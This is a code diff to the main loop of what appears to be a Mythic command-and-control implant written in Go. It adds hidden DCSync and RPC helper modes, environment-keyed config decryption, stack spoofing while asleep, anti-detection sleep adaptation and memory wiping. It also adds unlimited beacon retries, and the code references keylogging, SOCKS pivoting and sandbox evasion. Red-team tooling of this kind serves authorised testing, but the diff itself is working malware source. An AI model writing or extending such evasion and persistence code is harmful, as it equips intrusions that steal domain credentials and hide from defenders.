@@ -5,7 +5,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"log"
-	"math/rand"
 	"os"
 	"os/signal"
 	"sync"
@@ -20,6 +19,14 @@ import (
 )
 
 func main() {
+	if len(os.Args) > 1 && os.Args[1] == "--rpc-helper" {
+		commands.RunRPCHelper(os.Args[2:])
+		return
+	}
+	if len(os.Args) > 1 && os.Args[1] == "--dcsync-helper" {
+		commands.RunDcsyncHelper(os.Args[2:])
+		return
+	}
 	// Try running as a Windows service first. If started by SCM, this blocks
 	// and runs the agent in the service context (with full service privileges).
 	// On non-Windows or when not started by SCM, returns false immediately.
@@ -30,10 +37,15 @@ func main() {
 }
 
 func runAgent() {
-	// Phase 1: Deobfuscate config strings
+	// Phase 1: Decrypt environment-derived config (if env_key_derive is active)
+	if !deobfuscateEnvDerived() {
+		os.Exit(0)
+	}
+
+	// Phase 2: Deobfuscate config strings (XOR layer, if obfuscate_strings was used)
 	deobfuscateConfig()
 
-	// Phase 2: Parse and validate configuration
+	// Phase 3: Parse and validate configuration
 	cfg := parseConfigValues()
 	setupLogging(cfg.debug)
 
@@ -41,13 +53,13 @@ func runAgent() {
 		os.Exit(0)
 	}
 
-	// Phase 3: Apply startup security patches
+	// Phase 4: Apply startup security patches
 	applySecurity()
 
-	// Phase 4: Initialize agent struct
+	// Phase 5: Initialize agent struct
 	agent := initializeAgent(cfg)
 
-	// Phase 5: Initialize C2 profile
+	// Phase 6: Initialize C2 profile
 	c2Init, err := initC2Profile(cfg)
 	if err != nil {
 		log.Printf("%v", err)
@@ -70,15 +82,17 @@ func runAgent() {
 	sandboxGuardEnabled := sandboxGuard == "true"
 	sleepMaskEnabled := sleepMask == "true"
 	guardPagesEnabled := sleepGuardPages == "true"
+	stackSpoofEnabled := stackSpoof == "true" && commands.StackSpoofAvailable()
 	clearGlobals()
 
 	// Initialize command handlers and file transfer goroutines
 	commands.Initialize()
 	files.Initialize()
 
-	// Phase 6: Initial checkin with exponential backoff retry
+	// Phase 7: Initial checkin with exponential backoff retry
+	// maxRetries=0 means unlimited retries (never self-terminate)
 	log.Printf("connecting")
-	for attempt := 0; attempt < cfg.maxRetries; attempt++ {
+	for attempt := 0; cfg.maxRetries == 0 || attempt < cfg.maxRetries; attempt++ {
 		if err := c2.Checkin(agent); err != nil {
 			log.Printf("connect attempt %d: %v", attempt+1, err)
 			backoffMultiplier := 1 << min(attempt, 8)
@@ -119,17 +133,21 @@ checkinDone:
 	// Initialize SOCKS proxy manager
 	socksManager := socks.NewManager()
 	defer socksManager.Close()
+	commands.RegisterSocksManager(socksManager)
 
 	// Start main execution loop
 	log.Printf("running %s", agent.PayloadUUID[:8])
-	mainLoop(ctx, agent, c2, socksManager, cfg.maxRetries, sandboxGuardEnabled, sleepMaskEnabled, guardPagesEnabled)
+	mainLoop(ctx, agent, c2, socksManager, cfg.maxRetries, sandboxGuardEnabled, sleepMaskEnabled, guardPagesEnabled, stackSpoofEnabled)
 	usePadding() // Reference embedded padding to prevent compiler stripping
 	log.Printf("stopped")
 }
 
-func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, sandboxGuardEnabled bool, sleepMaskEnabled bool, guardPagesEnabled bool) {
+func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, sandboxGuardEnabled bool, sleepMaskEnabled bool, guardPagesEnabled bool, stackSpoofEnabled bool) {
 	// Semaphore to limit concurrent task goroutines (prevents memory exhaustion)
 	taskSem := make(chan struct{}, 20)
+
+	// Network correlator tracks sleep timing patterns for anti-detection
+	sleepCorrelator := commands.NewNetworkCorrelator(50)
 
 	// Main execution loop
 	retryCount := 0
@@ -150,7 +168,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 				waitMinutes := agent.MinutesUntilWorkingHours(time.Now())
 				if waitMinutes > 0 {
 					// Add jitter to the wake time (±jitter% of sleep interval, not the full wait)
-					jitterOffset := calculateSleepTime(agent.SleepInterval, agent.Jitter) - time.Duration(agent.SleepInterval)*time.Second
+					jitterOffset := commands.CalculateAdaptiveSleep(agent.SleepInterval, agent.Jitter, agent.JitterProfile) - time.Duration(agent.SleepInterval)*time.Second
 					sleepDuration := time.Duration(waitMinutes)*time.Minute + jitterOffset
 					log.Printf("schedule pause %v", sleepDuration)
 					var whVault *sleepVault
@@ -161,7 +179,11 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 							whGuard = guardSleepPages(whVault)
 						}
 					}
-					time.Sleep(sleepDuration)
+					if stackSpoofEnabled {
+						commands.StackSpoofSleep(sleepDuration)
+					} else {
+						time.Sleep(sleepDuration)
+					}
 					if sleepMaskEnabled {
 						if guardPagesEnabled {
 							unguardSleepPages(whGuard, whVault)
@@ -172,6 +194,11 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 				}
 			}
 
+			// Record check-in timing for network correlation analysis
+			if sleepCorrelator != nil {
+				sleepCorrelator.RecordCheckIn()
+			}
+
 			// Drain any pending outbound SOCKS data to include in this poll
 			outboundSocks := socksManager.DrainOutbound()
 
@@ -179,11 +206,13 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 			tasks, inboundSocks, err := c2.GetTasking(agent, outboundSocks)
 			if err != nil {
 				log.Printf("poll error: %v", err)
+				if len(outboundSocks) > 0 {
+					socksManager.RequeuePending(outboundSocks)
+				}
 				retryCount++
-				// Exponential backoff: sleep 2^(retryCount-1) * base interval, capped at 5 minutes
-				backoffMultiplier := 1 << min(retryCount-1, 8) // 1, 2, 4, 8, 16, ...
+				backoffMultiplier := 1 << min(retryCount-1, 8)
 				backoffSeconds := agent.SleepInterval * backoffMultiplier
-				maxBackoff := 300 // 5 minutes cap
+				maxBackoff := 300
 				if backoffSeconds > maxBackoff {
 					backoffSeconds = maxBackoff
 				}
@@ -204,21 +233,46 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 			// so long-running commands (SOCKS, keylog, port-scan) don't block new tasks.
 			// Semaphore limits concurrency to prevent memory exhaustion.
 			for _, task := range tasks {
+				// Initialize StartTime and Job on the tracked task itself so
+				// `jobs` reports a real duration and `jobkill -id` flips the
+				// same Stop counter the running goroutine is polling. Setting
+				// these inside processTaskWithAgent (which takes the task by
+				// value) only mutated a local copy, leaving the tracked task
+				// with zero StartTime and a nil Job — jobkill reported
+				// "Stop signal sent" but never reached the runner.
+				task.StartTime = time.Now()
+				task.Job = &structs.Job{
+					Stop:                         new(int),
+					SendResponses:                make(chan structs.Response, 100),
+					SendFileToMythic:             files.SendToMythicChannel,
+					GetFileFromMythic:            files.GetFromMythicChannel,
+					FileTransfers:                make(map[string]chan json.RawMessage),
+					InteractiveTaskInputChannel:  make(chan structs.InteractiveMsg, 100),
+					InteractiveTaskOutputChannel: make(chan structs.InteractiveMsg, 100),
+				}
+
 				// Track task synchronously BEFORE spawning goroutine — prevents a race
 				// where obfuscateSleep sees GetRunningTasks()==0 because the goroutine
 				// hasn't called TrackTask yet, causing C2 profile fields to be zeroed
 				// while task goroutines still need them for PostResponse.
 				commands.TrackTask(&task)
 				taskSem <- struct{}{} // Acquire semaphore slot
-				go func(t structs.Task) {
+				go func(t *structs.Task) {
 					defer func() { <-taskSem }() // Release slot when done
 					defer commands.UntrackTask(t.ID)
 					processTaskWithAgent(t, agent, c2, socksManager)
-				}(task)
+				}(&task)
 			}
 
+			// Pre-sleep cleanup: zero sensitive data from memory
+			commands.PreSleepCleanup()
+
 			// Sleep before next iteration — with optional sleep mask, guard pages, and sandbox detection
-			sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
+			sleepTime := commands.CalculateAdaptiveSleep(agent.SleepInterval, agent.Jitter, agent.JitterProfile)
+			// Adapt sleep based on observed check-in interval patterns
+			if sleepCorrelator != nil {
+				sleepTime = sleepCorrelator.AdaptSleep(sleepTime)
+			}
 			var vault *sleepVault
 			var guard *guardedPages
 			if sleepMaskEnabled {
@@ -227,13 +281,20 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 					guard = guardSleepPages(vault)
 				}
 			}
+			sleepStart := time.Now()
 			sleepSkipped := false
 			if sandboxGuardEnabled {
 				if !guardedSleep(sleepTime) {
 					sleepSkipped = true
 				}
+			} else if stackSpoofEnabled {
+				commands.StackSpoofSleep(sleepTime)
 			} else {
 				time.Sleep(sleepTime)
+			}
+			// Record actual sleep duration for correlation analysis
+			if sleepCorrelator != nil {
+				sleepCorrelator.RecordSleep(time.Since(sleepStart))
 			}
 			if sleepMaskEnabled {
 				if guardPagesEnabled {
@@ -241,6 +302,8 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 				}
 				deobfuscateSleep(vault, agent, c2)
 			}
+			// Post-sleep re-initialization
+			commands.PostSleepInit()
 			if sleepSkipped {
 				log.Printf("timing anomaly, exiting")
 				return
@@ -249,21 +312,14 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 	}
 }
 
-func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager) {
-	task.StartTime = time.Now()
+func processTaskWithAgent(task *structs.Task, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager) {
 	log.Printf("exec %s (%s)", task.Command, task.ID)
 
-	// Create Job struct with channels for this task
-	job := &structs.Job{
-		Stop:                         new(int),
-		SendResponses:                make(chan structs.Response, 100),
-		SendFileToMythic:             files.SendToMythicChannel,
-		GetFileFromMythic:            files.GetFromMythicChannel,
-		FileTransfers:                make(map[string]chan json.RawMessage),
-		InteractiveTaskInputChannel:  make(chan structs.InteractiveMsg, 100),
-		InteractiveTaskOutputChannel: make(chan structs.InteractiveMsg, 100),
-	}
-	task.Job = job
+	// StartTime + Job are populated by the caller (see the task dispatch loop
+	// above). They live on the tracked task pointer so `jobs` reports the
+	// real running duration and `jobkill -id` flips the same Stop counter
+	// the runner is checking.
+	job := task.Job
 
 	// Start goroutine to forward responses from the job to Mythic
 	done := make(chan bool)
@@ -349,9 +405,9 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 			}
 		}()
 		if agentHandler, ok := handler.(structs.AgentCommand); ok {
-			result = agentHandler.ExecuteWithAgent(task, agent)
+			result = agentHandler.ExecuteWithAgent(*task, agent)
 		} else {
-			result = handler.Execute(task)
+			result = handler.Execute(*task)
 		}
 	}()
 
@@ -378,26 +434,7 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 }
 
 func calculateSleepTime(interval, jitter int) time.Duration {
-	if jitter == 0 {
-		return time.Duration(interval) * time.Second
-	}
-
-	// Freyja-style jitter calculation
-	// Jitter is a percentage (0-100) that creates variation around the interval
-	jitterFloat := float64(rand.Intn(jitter)) / float64(100)
-	jitterDiff := float64(interval) * jitterFloat
-
-	// Randomly add or subtract jitter (50/50 chance)
-	if rand.Intn(2) == 0 {
-		actualInterval := interval + int(jitterDiff)
-		return time.Duration(actualInterval) * time.Second
-	} else {
-		actualInterval := interval - int(jitterDiff)
-		if actualInterval < 1 {
-			actualInterval = 1 // Minimum 1 second
-		}
-		return time.Duration(actualInterval) * time.Second
-	}
+	return commands.CalculateAdaptiveSleep(interval, jitter, "uniform")
 }
 
 // guardedSleep performs a sleep with sandbox detection. If the sleep completes
